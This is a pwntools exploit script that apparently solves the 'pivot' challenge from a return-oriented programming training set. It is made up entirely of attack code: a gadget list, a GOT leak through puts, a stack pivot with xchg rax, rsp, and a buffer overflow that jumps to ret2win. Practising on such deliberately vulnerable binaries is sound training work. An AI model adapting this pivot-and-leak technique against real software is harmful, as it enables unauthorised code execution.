from pwn import *

context.log_level = "debug"
r = process("./pivot")
lib = ELF("./libpivot.so")
exe = r.elf

# Gadgets:
# 0x00000000004009bb: pop rax; ret;
# 0x00000000004009bd: xchg rax, rsp; ret;
# 0x0000000000400a33: pop rdi; ret;

pop_rax = p64(0x4009BB)
xchg_rax_rsp = p64(0x4009BD)
pop_rdi = p64(0x400A33)

r.recvuntil(b"pivot: ")
rop_base = int(r.recvline().decode().strip(), 16)
print(hex(rop_base))

payload1 = (
    p64(exe.plt["foothold_function"])
    + pop_rdi
    + p64(exe.got["foothold_function"])
    + p64(exe.plt["puts"])
    + p64(exe.sym["main"])
)
payload2 = cyclic(0x28) + pop_rax + p64(rop_base) + xchg_rax_rsp

r.recvuntil(b"> ")
r.send(payload1)
r.recvuntil(b"> ")
r.send(payload2)
r.recvuntil(b"libpivot\n")
foothold_function = r.recvline()[:-1]
foothold_function = u64(foothold_function + (8 - len(foothold_function)) * b"\x00")
ret2win = foothold_function - lib.sym["foothold_function"] + lib.sym["ret2win"]
r.recvuntil(b"> ")
r.send(b"aa")
r.recvuntil(b"> ")
r.send(cyclic(0x28) + p64(ret2win))
r.interactive()
